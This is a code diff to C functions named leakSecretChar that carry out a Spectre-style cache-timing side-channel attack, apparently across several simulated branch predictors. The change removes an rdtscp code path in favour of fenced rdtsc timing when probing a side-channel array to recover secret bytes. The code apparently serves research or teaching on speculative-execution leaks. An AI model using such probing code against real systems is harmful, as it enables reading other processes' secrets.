@@ -1,4 +1,3 @@
-#include "parameters.h"
 
 uint8_t leakSecretChar(size_t OOB_index, NBitSmithPredictor* pred, uint64_t cache_hit_threshold, int attempts, int training_iterations) {
     // Static pc value for the branch predictors
@@ -54,19 +53,13 @@ uint8_t leakSecretChar(size_t OOB_index, NBitSmithPredictor* pred, uint64_t cach
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            #ifndef ALLOW_RDTSCP
-                t1 = __rdtscp(&aux); // Get timer start
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-            #else
-                _mm_mfence();
-                t1 = __rdtsc(); // Get timer start
-                _mm_mfence();
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                _mm_mfence();
-                t2 = __rdtsc() - t1; // Get timer elapsed
-                _mm_mfence();
-            #endif
+            _mm_mfence();
+            t1 = __rdtsc(); // Get timer start
+            _mm_mfence();
+            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+            _mm_mfence();
+            t2 = __rdtsc() - t1; // Get timer elapsed
+            _mm_mfence();
 
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
@@ -159,19 +152,13 @@ uint8_t leakSecretChar(size_t OOB_index, BimodalPredictor* pred, uint64_t cache_
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            #ifndef ALLOW_RDTSCP
-                t1 = __rdtscp(&aux); // Get timer start
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-            #else
-                _mm_mfence();
-                t1 = __rdtsc(); // Get timer start
-                _mm_mfence();
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                _mm_mfence();
-                t2 = __rdtsc() - t1; // Get timer elapsed
-                _mm_mfence();
-            #endif
+            _mm_mfence();
+            t1 = __rdtsc(); // Get timer start
+            _mm_mfence();
+            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+            _mm_mfence();
+            t2 = __rdtsc() - t1; // Get timer elapsed
+            _mm_mfence();
 
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
@@ -264,19 +251,13 @@ uint8_t leakSecretChar(size_t OOB_index, GSharePredictor* pred, uint64_t cache_h
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            #ifndef ALLOW_RDTSCP
-                t1 = __rdtscp(&aux); // Get timer start
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-            #else
-                _mm_mfence();
-                t1 = __rdtsc(); // Get timer start
-                _mm_mfence();
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                _mm_mfence();
-                t2 = __rdtsc() - t1; // Get timer elapsed
-                _mm_mfence();
-            #endif
+            _mm_mfence();
+            t1 = __rdtsc(); // Get timer start
+            _mm_mfence();
+            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+            _mm_mfence();
+            t2 = __rdtsc() - t1; // Get timer elapsed
+            _mm_mfence();
 
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
@@ -369,19 +350,13 @@ uint8_t leakSecretChar(size_t OOB_index, HybridPredictor* pred, uint64_t cache_h
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            #ifndef ALLOW_RDTSCP
-                t1 = __rdtscp(&aux); // Get timer start
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-            #else
-                _mm_mfence();
-                t1 = __rdtsc(); // Get timer start
-                _mm_mfence();
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                _mm_mfence();
-                t2 = __rdtsc() - t1; // Get timer elapsed
-                _mm_mfence();
-            #endif
+            _mm_mfence();
+            t1 = __rdtsc(); // Get timer start
+            _mm_mfence();
+            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+            _mm_mfence();
+            t2 = __rdtsc() - t1; // Get timer elapsed
+            _mm_mfence();
 
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
@@ -477,19 +452,13 @@ uint8_t leakSecretChar(size_t OOB_index, BasePredictor* pred, uint64_t cache_hit
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            #ifndef ALLOW_RDTSCP
-                t1 = __rdtscp(&aux); // Get timer start
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-            #else
-                _mm_mfence();
-                t1 = __rdtsc(); // Get timer start
-                _mm_mfence();
-                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-                _mm_mfence();
-                t2 = __rdtsc() - t1; // Get timer elapsed
-                _mm_mfence();
-            #endif
+            _mm_mfence();
+            t1 = __rdtsc(); // Get timer start
+            _mm_mfence();
+            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+            _mm_mfence();
+            t2 = __rdtsc() - t1; // Get timer elapsed
+            _mm_mfence();
 
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
